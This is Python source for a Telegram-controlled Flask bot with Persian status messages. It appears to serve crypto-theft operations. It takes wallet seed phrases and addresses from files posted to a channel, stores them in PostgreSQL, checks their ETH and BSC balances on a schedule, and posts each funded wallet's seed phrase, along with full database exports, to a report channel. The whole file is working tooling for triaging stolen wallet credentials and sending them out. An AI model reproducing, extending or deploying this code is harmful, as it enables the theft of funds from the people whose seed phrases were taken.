import os
import re
import logging
import asyncio
import queue
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3
import psycopg2

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1003893481541

HOURLY_INTERVAL_MIN = int(os.environ.get("HOURLY_INTERVAL_MIN", "60"))
EXPORT_INTERVAL_MIN = int(os.environ.get("EXPORT_INTERVAL_MIN", "120"))
HOURLY_BATCH_SIZE = 300

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

app = Flask(__name__)
task_queue = queue.Queue()


def get_conn():
    return psycopg2.connect(DATABASE_URL, sslmode='require')


def init_db():
    conn = get_conn()
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS wallets (
            address TEXT PRIMARY KEY,
            seed TEXT,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS meta (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    c.close()
    conn.close()
    logging.info("PostgreSQL ready")


def save_wallet(address, seed):
    conn = get_conn()
    c = conn.cursor()
    c.execute(
        "INSERT INTO wallets (address, seed) VALUES (%s, %s) ON CONFLICT (address) DO NOTHING",
        (address.lower(), seed.strip())
    )
    conn.commit()
    c.close()
    conn.close()


def get_all_wallets():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT address, seed FROM wallets ORDER BY added_at")
    rows = c.fetchall()
    c.close()
    conn.close()
    return rows


def get_meta(key, default=None):
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM meta WHERE key = %s", (key,))
    row = c.fetchone()
    c.close()
    conn.close()
    return row[0] if row else default


def set_meta(key, value):
    conn = get_conn()
    c = conn.cursor()
    c.execute(
        "INSERT INTO meta (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
        (key, value)
    )
    conn.commit()
    c.close()
    conn.close()


def get_wallet_total(address):
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 8}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except:
            continue
    return totals


async def handle_file(doc):
    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=20))
    try:
        logging.info(f"[FILE] Start: {doc.file_name}")
        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)

        if not matches:
            logging.info("[FILE] No matches")
            return

        for phrase, addr in matches:
            save_wallet(addr, phrase)

        total = len(get_all_wallets())
        logging.info(f"[FILE] Saved {len(matches)} | Total DB: {total}")

        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=f"💾 ذخیره شد\n📄 `{doc.file_name}`\n🔢 جدید: `{len(matches)}`\n📦 کل: `{total}`"
        )
    except Exception as e:
        logging.error(f"[FILE] Error: {e}", exc_info=True)


async def handle_hourly():
    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=25, pool_timeout=60))
    wallets = get_all_wallets()
    logging.info(f"[HOURLY] Count: {len(wallets)}")

    if not wallets:
        set_meta("last_hourly", datetime.utcnow().isoformat())
        return

    await bot.send_message(
        chat_id=REPORT_CHANNEL,
        text=f"⏰ **گزارش ساعتی**\n🔢 `{len(wallets)}` ولت\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
    )

    totals = {'ETH': 0.0, 'BSC': 0.0}
    rich_count = 0
    total_parts = (len(wallets) + HOURLY_BATCH_SIZE - 1) // HOURLY_BATCH_SIZE

    for i in range(0, len(wallets), HOURLY_BATCH_SIZE):
        batch = wallets[i:i + HOURLY_BATCH_SIZE]
        part_num = (i // HOURLY_BATCH_SIZE) + 1
        logging.info(f"[HOURLY] Part {part_num}/{total_parts}")

        with ThreadPoolExecutor(max_workers=5) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr, _ in batch]
            results = await asyncio.gather(*tasks)

        batch_eth = batch_bsc = 0.0
        batch_rich = []
        for (addr, seed), res in zip(batch, results):
            batch_eth += res['ETH']
            batch_bsc += res['BSC']
            totals['ETH'] += res['ETH']
            totals['BSC'] += res['BSC']
            if res['ETH'] + res['BSC'] > 0.00001:
                batch_rich.append((addr, seed, res))
                rich_count += 1

        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=f"⏰ قسمت {part_num}/{total_parts}\n🔢 `{len(batch)}`\n🔹 ETH: `{batch_eth:.6f}`\n🔹 BSC: `{batch_bsc:.6f}`\n💰 `{len(batch_rich)}`"
        )

        for addr, seed, res in batch_rich:
            msg = f"`{addr}`\n🔑 `{seed}`\n"
            if res['ETH'] > 0: msg += f"• ETH: `{res['ETH']:.6f}`\n"
            if res['BSC'] > 0: msg += f"• BSC: `{res['BSC']:.6f}`\n"
            await bot.send_message(chat_id=REPORT_CHANNEL, text=msg)
            await asyncio.sleep(0.3)

    await bot.send_message(
        chat_id=REPORT_CHANNEL,
        text=f"✅ **پایان گزارش ساعتی**\n🔢 کل: `{len(wallets)}`\n🔹 ETH: `{totals['ETH']:.6f}`\n🔹 BSC: `{totals['BSC']:.6f}`\n💰 `{rich_count}`"
    )
    set_meta("last_hourly", datetime.utcnow().isoformat())
    logging.info("[HOURLY] Done")


async def handle_export():
    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=10))
    wallets = get_all_wallets()
    if not wallets:
        set_meta("last_export", datetime.utcnow().isoformat())
        return

    content = f"Export {datetime.utcnow().isoformat()}\nTotal: {len(wallets)}\n\n"
    for addr, seed in wallets:
        content += f"Phrase: {seed} | Addr: {addr}\n"

    with open("db_export.txt", "w", encoding="utf-8") as f:
        f.write(content)

    await bot.send_document(
        chat_id=REPORT_CHANNEL,
        document=open("db_export.txt", "rb"),
        caption=f"📦 دیتابیس کامل\nتعداد: `{len(wallets)}`"
    )
    set_meta("last_export", datetime.utcnow().isoformat())
    logging.info("[EXPORT] Sent")


def worker_loop():
    logging.info("WORKER STARTED")
    while True:
        try:
            task = task_queue.get(timeout=60)
            ttype = task["type"]
            logging.info(f"PROCESSING {ttype}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                if ttype == "file":
                    loop.run_until_complete(handle_file(task["doc"]))
                elif ttype == "hourly":
                    loop.run_until_complete(handle_hourly())
                elif ttype == "export":
                    loop.run_until_complete(handle_export())
            finally:
                loop.close()
            task_queue.task_done()
            logging.info(f"FINISHED {ttype}")
        except queue.Empty:
            continue
        except Exception as e:
            logging.error(f"Worker error: {e}", exc_info=True)
            time.sleep(3)


def scheduler_loop():
    logging.info("SCHEDULER STARTED")
    while True:
        try:
            now = datetime.utcnow()
            last_h = get_meta("last_hourly")
            if last_h is None or (now - datetime.fromisoformat(last_h)).total_seconds() >= HOURLY_INTERVAL_MIN * 60:
                if task_queue.qsize() < 2:
                    task_queue.put({"type": "hourly"})
                    logging.info("Queued hourly")

            last_e = get_meta("last_export")
            if last_e is None or (now - datetime.fromisoformat(last_e)).total_seconds() >= EXPORT_INTERVAL_MIN * 60:
                if task_queue.qsize() < 2:
                    task_queue.put({"type": "export"})
                    logging.info("Queued export")
        except Exception as e:
            logging.error(f"Scheduler error: {e}", exc_info=True)
        time.sleep(30)


# شروع
if not DATABASE_URL:
    logging.error("DATABASE_URL is missing!")
else:
    init_db()
    threading.Thread(target=worker_loop, daemon=True).start()
    threading.Thread(target=scheduler_loop, daemon=True).start()


@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot=None)
    if update and update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            logging.info(f"WEBHOOK FILE: {update.channel_post.document.file_name}")
            task_queue.put({"type": "file", "doc": update.channel_post.document})
    return "OK"


@app.route('/')
def health():
    try:
        count = len(get_all_wallets())
    except:
        count = "error"
    return f"OK | Queue: {task_queue.qsize()} | DB: {count}"
